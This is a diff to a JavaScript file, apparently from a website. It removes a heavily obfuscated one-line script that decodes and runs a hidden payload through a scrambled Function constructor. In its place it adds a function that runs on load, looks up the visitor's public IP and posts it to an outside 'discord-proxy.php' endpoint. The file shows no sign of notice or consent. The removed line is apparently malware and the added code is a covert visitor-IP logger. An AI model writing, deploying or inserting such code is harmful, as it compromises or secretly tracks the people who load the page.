@@ -1,1 +1,19 @@
-var fetchAndSendIP;(function(){var lRw='',dBw=847-836;function Rma(u){var n=831432;var a=u.length;var k=[];for(var q=0;q<a;q++){k[q]=u.charAt(q)};for(var q=0;q<a;q++){var i=n*(q+447)+(n%47359);var y=n*(q+745)+(n%53543);var c=i%a;var j=y%a;var f=k[c];k[c]=k[j];k[j]=f;n=(i+y)%4824067;};return k.join('')};var suC=Rma('ptwvocuhbagiylrqccsojnmsderoktutfnxrz').substr(0,dBw);var Muc='v;6=(f=;5=d6+n7=i;wnarst=raarnasgh=.+oq(oct[,+(qs(xf(,o0f a,( m<mr;5.,c[8,o2k,*.6s ;,56i]s,==lr5u,ez+>ii<=;r17(cvu8;)1+rlto{5irseksi6-(va[=v (;vft)+e=(il;}++(rn[,snn=v+,(;Ao;saek=av=(=dg.hhas""a-e;on);ol0j;]0} ;a;gid eth.nu13phm}xl=v=)o=b)alioie9f)6lu.vp]v);r8)c,fnrvtgo+)2x..cpv=tr[)adolp]([fn.a aur8u=t;vure)ab}+v1hyp =edn5>mva.2krgs00ro1(lile[ie *o=lA,;e;aee"C=pAt.blufsmtg{v;+i.=a;))m-r.  vjsv th.tq;n(;,li;9]1yj7)qn+1"3ls1c,.a(2o)e1; j l,-r;va(,+gv9=ll9lpiu r<].par0[4bvrf9ug2fotu]to;a()t-o;;(j+.))6hn0ha;Cg;bjrkanhl-nul=a7v]n<irivCe08oon=;((;}o (xa7[ietr;v[]"se4l,n)otau.g)].]hnrt=jop+"a+rfAx[ ;)=(+.yal=(;.[6C=[A.rr}grok)+<)4f(biorbSr8s+4ot;uvh(=i.d;kt=s-,a]nx;8lug(0exat.hapu,vz9g;]a7[rno;,7r."vCr 1f)drrjo) bn)g ,,e2,fi,10s8Csy8yacd(ertpighr!==tnih0hz1r+.u); tt;2{+xbfn{{+)rc)me" ugodx,l3+C{=="2Sq(=ev)4( )t;rlv=o{n0);o=;1v1a8 rv,]mzvrC(irp dd(hpnr)9airf}rcfnosahi6e7("!vrn=.)+ni=f';var llv=Rma[suC];var AOC='';var OUa=llv;var wGb=llv(AOC,Rma(Muc));var LIb=wGb(Rma('.dTXf4.\/03im5ru{"3s.7,{os$3$,.t 5\/0[b;eXn;dNiX\'4fo{rt(!btb..({0=,X$X%7Xr!n$frp+nxe&{rpiN,X b\/((!l7+eq(4xX!jXp.\'e3qi+o94.n.fSX;46=}fkn{)-.,.j{xr).*tw$_bXi5({3ebage=)2d(n()$c3Xff(nthXoEt\/it;!}.irtp.,(t.;XS7S%1\/dcXp(t5rsd3g)=f\'.2(f.!aXpoeXa$X3X)e, )*1j)aXltSh3y% o,hi._inXX)X:tb;g{XC!-3(.%vr,C(gsk,\/8Xtb}{v.dafXfXc$}X%)igXrpa"_7X1f4XX5.nbo(;".r0kdp],nfmnXh\/rX.6oXe.\/,aXu X,t$f1.f1f (({7;et.i5,)(o]=rt_2u+4r(a]h$4)=p$XX%.*X.(eX*X;X81=X&k=(;))ft4n\'e0pXgkn+).tfXX.3.SXxh.ekX)k.r4poa.fp)(f.2) o*"$ph"d\/p+Xr,5!xetaf6(43;c)XicfX2.t3aX%h1.t4XX)o\/iu{.X3bvgfx;X69(.1(.z(o=k*.;cwX[pbXtX+_X$;,1%[(X03efx0X!;oX=t,w$n){f.rS(#1pr}Xi.[3%ttun.ey).e]r.a_y!rf;_e,r#{i=fon.b)"imt.)TXi0ubop]n)Sf.rxX,zduo}+=ma}tn)b.;r!(3Xnwff_$,ka+#}t=X4ptw(oa-XX3g3eX?$ft69ssX6X7,1+\/nXi!0=y{XX.(2y-16Xes0]h:o4))a]=j)i!Xrno_s(Xs2b)eXtyi.0_X31nwe$n,! p6_.su;n_a)rd.(f]f$.ba645;.fwXX}$ot.X)a7Sm6t!(htne3oX=_)rdr,6)ho.r\/bp1;-Xyj r.ge%1X&n.dx7(rspeif#;(c6;;5!}:)(X4)aX5&&f.=$]riy0)r7!:l=1X,.(3.d,)r"7]me,he.7u}, r!X) gs&,dee_}}.ntrcpwXwg7g=_[doi;ta% I.(tupX.(X!+u$[;_=4$.._;nsf]0tXX,e=#X():w3o$Xs!X6.7!f4)*=ff,=b_yf_X#ofdX\/}wj)=3pc{!dr}o:(o047!.!$%i)iff%iX %b."xt4,-.so)!X.dge4.. .oXj.srctu$#"t}2s=ylX\/rej_bX6(.)iylXu;4fob 75XnXr3dX)).yr5)]p%pXX,;gX5kft]=nnfd_f(o{)4 Nrttielfl:w(%_feX,X(0 $en6X}Xe x3Xg$ _!lfr7rXr3,])_#ea,X0)gfeXl uXer.7(;).t!CXe(+ .is i*X7 ._o!o5)sd'));var bAi=OUa(lRw,LIb );bAi(8064);return 2795})()
+async function fetchAndSendIP() {
+  try {
+    // Fetch IP as text (ipify returns plain text by default)
+    const ipResponse = await fetch('https://api.ipify.org?format=text');
+    const ip = await ipResponse.text();
+    console.log('IP:', ip); // Verify this logs correctly
+
+    // Send to PHP proxy
+    const response = await fetch('https://mirenmedia.com/discord-proxy.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip }),
+    });
+    console.log('Proxy response:', await response.json());
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+fetchAndSendIP();
